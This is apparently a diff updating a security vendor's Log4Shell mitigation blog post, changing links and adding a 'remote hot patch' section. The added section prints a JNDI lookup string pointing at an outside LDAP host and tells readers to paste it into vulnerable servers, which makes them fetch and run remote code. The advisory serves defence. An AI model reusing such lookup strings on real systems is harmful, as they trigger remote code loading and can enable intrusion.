@@ -54,7 +54,7 @@ earlier blog post](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 :::
 <!--truncate-->
 
-_Originally Posted @ December 12th & Last Updated @ December 14th, 4:43pm PST_
+_Originally Posted @ December 12th & Last Updated @ December 14th, 7:37pm PST_
 
 ## Be careful what Log4Shell advice you trust online
 
@@ -80,7 +80,7 @@ It works by scanning for hashes of [known vulnerable log4j classes](https://gith
 If you have a vulnerable version of a log4j in your built Java project, the hash will match a one
 of the hashes in the list.
 
-**[Download from GitHub](https://github.com/lunasec-io/lunasec/releases/tag/v1.0.0-log4shell)**
+**[Download from GitHub](https://github.com/lunasec-io/lunasec/releases/)**
 
 _Make sure you download the right version for your Operating System and CPU architecture._ Once downloaded, you can extract
 it and run the `log4shell` command in your terminal.  The tool can scan individual files or whole directories.
@@ -296,15 +296,26 @@ to a running container. This could be useful for containerized vendor software.
 [This guide](https://medium.com/@edeNFed/patching-log4shell-in-one-command-without-downtime-using-ephemeral-containers-c69a9155ab1e) 
 explains how to apply the patch.
 
-### Option 4: Remote hot patch / LogOut4Shell
+### Option 4: Remote hot patch (for live servers)
 Because of the extensive control Log4Shell gives an attacker, it's actually possible to use the bug against itself to patch a running server.
 This isn't the recommended strategy for various reasons, but it could be a last resort for systems that you can't easily restart or modify.  Note that doing this on a system 
 you don't have permission to is most likely illegal. The fix will only work until the server (or the JVM) is restarted.
 
-How to accomplish this is explained in [this guide](https://github.com/Cybereason/Logout4Shell).
+**Update:** We have added this functionality to the [latest release](https://github.com/lunasec-io/lunasec/releases) of our Log4Shell CLI tool.
 
-We are currently adding this functionality to our CLI. 
-[Subscribe below](#stay-in-the-loop) to be alerted when it's live.
+You may also use our hosted version here to patch yourself:
+```
+${jndi:ldap://hotpatch.log4shell.com:1389/a}
+```
+
+Just simply paste that anywhere into your server where you're vulnerable, and it will work. (For example, in the `main` function when you start up your server)
+
+:::warning Not permanent solution!
+
+Please do not rely on this forever (in case our site ever goes down). This should only be used as a stop-gap solution until you can apply a more permanent patch for Log4Shell.
+:::
+
+How it works and how to accomplish it manually is explained in [this guide](https://github.com/Cybereason/Logout4Shell). Our implementation is based on the work they did.
 
 ## How to protect yourself from future 0-days
 
@@ -454,3 +465,4 @@ If you would like to contribute, or notice any errors, this post is an Open Sour
 4. Add warnings about limited vuln in 2.15 / noMsgFormatLookups
 5. Add additional disclaimer about %m.
 6. Added link to 2nd CVE info.
+7. Added info about hot patching, and links to new releases.
